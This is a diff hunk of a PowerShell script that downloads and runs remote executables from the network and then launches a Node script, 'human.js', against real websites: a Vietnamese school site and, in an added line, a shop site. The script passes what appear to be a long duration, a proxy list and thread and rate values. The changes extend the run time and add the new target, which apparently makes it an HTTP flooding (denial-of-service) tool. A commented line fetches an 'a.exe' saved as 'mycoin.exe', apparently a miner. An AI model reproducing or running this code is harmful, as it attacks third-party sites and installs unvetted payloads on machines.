@@ -43,8 +43,8 @@ Invoke-WebRequest -Uri $url -OutFile $outfile
 Start-Process $outfile
 
 $path="$env:TEMP\human.js"; while(-not (Test-Path $path)){ Start-Sleep -Seconds 1 }
-Start-Process node -ArgumentList "--trace-warnings","human.js","https://thcs-quangtrung-phuong2baoloc.lamdong.dlib.vn?n=iloveschoolverymuch","6000","kk.txt","15","200" -WorkingDirectory $env:TEMP -NoNewWindow -PassThru
-
+Start-Process node -ArgumentList "--trace-warnings","human.js","https://thcs-quangtrung-phuong2baoloc.lamdong.dlib.vn?n=iloveschoolverymuch","60000000","kk.txt","15","90" -WorkingDirectory $env:TEMP -NoNewWindow -PassThru
+Start-Process node -ArgumentList "--trace-warnings","human.js","https://taphoahiha.com/","60000000","kk.txt","15","90" -WorkingDirectory $env:TEMP -NoNewWindow -PassThru
 $url = "http://zwalx5oi.x10.mx/a.exe"
 $outfile = "$env:TEMP\mycoin.exe"
 # Invoke-WebRequest -Uri $url -OutFile $outfile
